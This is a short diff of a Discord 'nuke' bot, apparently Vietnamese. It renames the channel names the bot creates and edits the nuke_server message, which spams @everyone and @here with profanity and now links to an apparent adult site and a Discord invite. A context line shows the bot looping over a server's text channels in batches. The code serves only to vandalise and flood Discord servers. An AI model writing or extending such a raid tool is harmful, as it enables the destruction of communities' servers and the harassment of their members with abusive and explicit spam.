@@ -239,7 +239,7 @@ WORK_SCENARIOS = [
 
 # ==================== HỆ THỐNG NUKE SERVER TỐI CAO ====================
 NUKE_CHANNEL_NAMES = [
-    "NUKE BY LUNAL KINGDOM",
+    "NUKE BY WAR ART",
     "NUKE BY BẢO ĐẸP ZAI",
     "NUKE BY BOT NUKE ON TOP",
     "DETROYED BY BOT NUKE EZ TOP"
@@ -385,8 +385,8 @@ async def nuke_server(ctx):
             "# SEVER ÓC CẶC CHÚNG MÀY ĐÃ BỊ NUKE BỞI BẢO ĐẸP ZAI\n"
             "|| @everyone||\n"
             "|| @here ||\n"
-            '"link support 1: https://discord.gg/hqa3xAzsbk"\n'
-            ' "link support 2: https://discord.gg/j9KeGaPXh"'
+            '"link support 1: https://xnhau.pics/"\n'
+            ' "link support 2: https://discord.gg/9Jwdu64tFX"'
         )
         all_channels = ctx.guild.text_channels
         batch_size = 5
